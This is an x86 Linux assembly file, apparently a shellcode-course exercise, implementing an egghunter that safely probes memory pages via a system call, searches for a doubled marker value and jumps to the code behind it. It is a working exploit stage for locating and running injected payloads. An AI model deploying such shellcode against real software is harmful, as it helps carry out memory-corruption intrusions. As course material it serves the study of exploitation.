; Filename: egghunter.asm
; Author:   Reuben Sammut
; SLAE ID:  510

global _start

section .text

_start:
	cld
	xor edx, edx
	mov ebx, edx

nextpage:
	or   bx, 0xfff
nextbyte:
	inc  ebx
	mov  eax, edx
	mov  al, 0xBA
	int  0x80
	cmp  al, 0xf2
	jz   nextpage
	mov  eax, 0xDEC0ADDE
	mov  edi, ebx
	scasd
	jnz  nextbyte
	scasd
	jnz  nextbyte
	jmp  edi

